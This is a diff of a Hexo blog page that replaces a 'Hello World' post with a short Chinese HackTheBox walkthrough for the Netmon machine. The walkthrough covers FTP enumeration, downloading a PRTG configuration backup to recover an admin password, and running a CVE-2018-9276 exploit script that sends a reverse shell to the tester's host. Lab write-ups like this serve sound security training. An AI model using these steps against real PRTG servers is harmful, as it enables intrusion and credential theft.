@@ -9,7 +9,7 @@
     
     <title>
         
-            Hello World |
+            Netmon - HackTheBox |
         
         Td
     </title>
@@ -171,7 +171,7 @@
         <div class="article-content-container border-box">
 
             <div class="article-title">
-                <span class="title-hover-animation">Hello World</span>
+                <span class="title-hover-animation">Netmon - HackTheBox</span>
             </div>
 
             
@@ -197,13 +197,13 @@
         
             <span class="meta-info-item article-create-date">
                 <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
-                <span class="pc">2022-08-29 11:31:12</span>
-                <span class="mobile">2022-08-29 11:31</span>
+                <span class="pc">2023-05-20 14:39:00</span>
+                <span class="mobile">2023-05-20 14:39</span>
             </span>
 
             <span class="meta-info-item article-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="pc">2022-08-29 11:31:12</span>
+                <span class="pc">2023-05-20 14:39:00</span>
             </span>
         
 
@@ -219,6 +219,9 @@
             <span class="article-tag meta-info-item border-box">
                 <i class="icon fas fa-tags"></i>&nbsp;
                 <ul>
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Hack-The-Box/">Hack-The-Box</a></li>
+                        
                     
                 </ul>
             </span>
@@ -244,17 +247,117 @@
                 <p><img  
                      lazyload
                      alt="image"
-                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/image/image.webp"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.6t7iezvalo80.webp"
                      
                 ></p>
-<p>很久没有见过这个标题了，之前也或多或少尝试过几次搭建blog，但是都没有坚持到现在，<del>主要是因为懒</del></p>
-<p>前几次都是用的腾讯云、阿里云等云平台购买的服务器进行搭建，后面由于忘记续费，<del>没钱</del>，所导致以前的数据也都不存在了，这次又一时兴起，想整一个blog出来，想到购买合适的服务器，以及购买域名，和日常维护等等等等一堆乱七八糟的事情</p>
-<p>所以就考虑搭建一个静态的，维护起来也省事，这次所选用的是Hexo+Keep+GitHub的组合，省去了购买服务器与域名的钱，以及无需操心遭受攻击，<del>除非能把Github打穿</del></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.wwcaus9hbpc.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.67knt1is2zs0.webp"
+                     
+                ></p>
+<p>先看80</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.2g6art2e4668.webp"
+                     
+                ></p>
+<p>左下方发现了程序名字<code>prtg network monitor</code>和版本<code>18.1.37</code>，搜一下看看</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.18m9cx139r34.webp"
+                     
+                ></p>
+<p>就一个rce，还是需要账号密码</p>
+<p>在看看21</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.5z53hf1n3jk0.webp"
+                     
+                ></p>
+<p>貌似，有点直接</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.532wgmgdt7s0.webp"
+                     
+                ></p>
+<p>网站目录下没有任何文件</p>
+<p><code>https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data</code></p>
+<p>在这发现了目录路径</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.6kh7pyb0l740.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.1or3kgwylzsw.webp"
+                     
+                ></p>
+<p>.bak貌似是个备份文件，下载下来</p>
+<p><code>wget http://10.10.10.152/ProgramData/Paessler/PRTG Network Monitor/PRTG Configuration.old.bak</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.1p69gb5cznvk.webp"
+                     
+                ></p>
+<p>找着密码了</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.32faxv57d9g0.webp"
+                     
+                ></p>
+<p>还是不对，搜了wp才知道，这玩意是备份密码，现在的密码把2018改成了2019，这谁想得到啊</p>
+<p><code>PrTg@dmin2019</code></p>
+<p>登录后台，现在有了账号密码，去试试那个rce</p>
+<p><code>https://github.com/A1vinSmith/CVE-2018-9276</code></p>
+<p><code>python cve.py -i 10.10.10.152 -p 80 --lhost 10.10.14.12 --lport 7777 --user prtgadmin --password &#39;PrTg@dmin2019&#39;</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.3trg9b9eujs0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.35t070r9ms20.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.staticaly.com/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Netmon/image.17jkafycvozg.webp"
+                     
+                ></p>
 
             </div>
 
             
 
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Hack-The-Box/"><i class="icon fas fa-hashtag"></i>Hack-The-Box</a>&nbsp;
+                        </li>
+                    
+                </ul>
             
 
             
@@ -263,18 +366,33 @@
                         <div class="article-prev">
                             <a class="prev"
                                rel="prev"
-                               href="/post/eb5b8f948eee/"
+                               href="/post/7a04ed4bdc1f/"
                             >
                             <span class="left arrow-icon flex-center">
                               <i class="fas fa-chevron-left"></i>
                             </span>
                                 <span class="title flex-center">
-                                <span class="post-nav-title-item text-ellipsis">cisp-pte</span>
+                                <span class="post-nav-title-item text-ellipsis">Lightweight - HackTheBox</span>
                                 <span class="post-nav-item">上一篇</span>
                             </span>
                             </a>
                         </div>
                     
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/post/4ed2fd6214e3/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item text-ellipsis">Hawk - HackTheBox</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
                     
                 </div>
             
